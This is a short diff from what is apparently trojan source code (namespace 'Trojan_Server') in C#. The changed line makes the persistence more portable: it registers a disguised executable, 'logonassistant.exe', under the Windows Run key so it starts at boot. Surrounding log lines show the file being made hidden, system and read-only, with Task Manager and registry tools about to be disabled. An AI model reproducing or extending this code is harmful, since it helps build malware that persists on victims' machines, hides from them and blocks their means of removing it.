@@ -172,7 +172,7 @@ namespace Trojan_Server
                 Log("File made to System, Hidden and Readonly!", "DEBUG");
                 Log("Trying to make Startup Key!", "DEBUG");
 	                RegistryKey k = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
-	                k.SetValue("logonassist", "C:\\Windows\\SysWOW64\\logonassistant.exe", RegistryValueKind.String);
+	                k.SetValue("logonassist", System.Environment.GetFolderPath(System.Environment.SpecialFolder.System)+ "\\logonassistant.exe", RegistryValueKind.String);
 	                k.Close();
                 Log("Startup RegistryKey angelegt!", "DEBUG");
                 Log("Trying to make DisableTaskMgr Key and DisableRegTools", "DEBUG");
